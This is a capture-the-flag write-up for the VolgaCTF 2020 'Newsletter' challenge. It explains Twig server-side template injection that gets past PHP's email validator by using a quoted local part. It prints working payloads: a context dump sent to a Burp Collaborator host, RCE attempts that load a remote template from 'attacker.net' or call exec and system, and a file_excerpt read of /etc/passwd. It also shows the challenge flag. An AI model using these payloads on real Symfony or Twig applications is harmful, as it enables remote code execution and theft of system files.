# web-Newsletter

## Description

Subscribe to our newsletter!

## Solution

Address: http://newsletter.q.2020.volgactf.ru/

The web app had a subscribe function that applied an email address. 
And we could get the source code of the app.

```php
<?php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\Mailer\MailerInterface;
use Symfony\Component\Mime\Email;

class MainController extends AbstractController
{
    public function index(Request $request)
    {
      return $this->render('main.twig');
    }

    public function subscribe(Request $request, MailerInterface $mailer)
    {
      $msg = '';
      $email = filter_var($request->request->get('email', ''), FILTER_VALIDATE_EMAIL);
      if($email !== FALSE) {
        $name = substr($email, 0, strpos($email, '@'));

        $content = $this->get('twig')->createTemplate(
          "<p>Hello ${name}.</p><p>Thank you for subscribing to our newsletter.</p><p>Regards, VolgaCTF Team</p>"
        )->render();

        $mail = (new Email())->from('newsletter@newsletter.q.2020.volgactf.ru')->to($email)->subject('VolgaCTF Newsletter')->html($content);
        $mailer->send($mail);

        $msg = 'Success';
      } else {
        $msg = 'Invalid email';
      }
      return $this->render('main.twig', ['msg' => $msg]);
    }


    public function source()
    {
        return new Response('<pre>'.htmlspecialchars(file_get_contents(__FILE__)).'</pre>');
    }
}
```

In the code above we see using of **TWIG** template engine. That means that we could try to exploit SSTI vulnerability.

But we have the following filtering function:

```php
$email = filter_var($request->request->get('email', ''), FILTER_VALIDATE_EMAIL);
```

With this function we can't use parentheses `( )` and other control symbols.

So for that validation example in PHP exists the bypass trick: https://stackoverflow.com/questions/30810758/is-filter-validate-email-sufficient-to-stop-shell-injection

*"The FILTER_VALIDATE_EMAIL implementation is based on Michael Rushton’s Email Address Validation, which validates the input using the RFC 5321, i. e., the Mailbox production rule."*

*"For example, RFC 5321 allows quoted strings in the Local-part like "…"@example.com."*

With this bypass we can send special symbols except spaces and double quotes.

Try to check it with a burp collaborator client.

```
POST /subscribe HTTP/1.1
Host: newsletter.q.2020.volgactf.ru
Content-Type: application/x-www-form-urlencoded
Content-Length: 82

email={{_context|json_encode}}@p6w8r8byumewg8qtdzjzacoxgomfa4.burpcollaborator.net
```

Mail content: 
```
...

<p>Hello {&quot;app&quot;:{}}.</p><p>Thank you for subscribing to our newsl= etter.</p><p>Regards, VolgaCTF Team</p> 
```

So, now we can try to retrieve the flag.
But popular RCE vectors didn't work.

Examples:

```
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

The validate filter didn't pass these examples. So, I decided to find a function to read arbitrary files of the system.

On the official site of Twig in the part "Twig Reference from Symfony" I found a suitable function.

```
"{{'/etc/passwd'|file_excerpt(1,300)}}"
```

Flag was in `/etc/passwd` and we could get it.

```
flag:x:1000:1000:VolgaCTF_6751602deea2a308ab611eeef7a4e961:/home/flag:/bin/false
```

Another solutions:

```
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{app.request.query.filter(0,0,1024,{'options':'system'})}} // ?0=cat+/etc/passwd
```
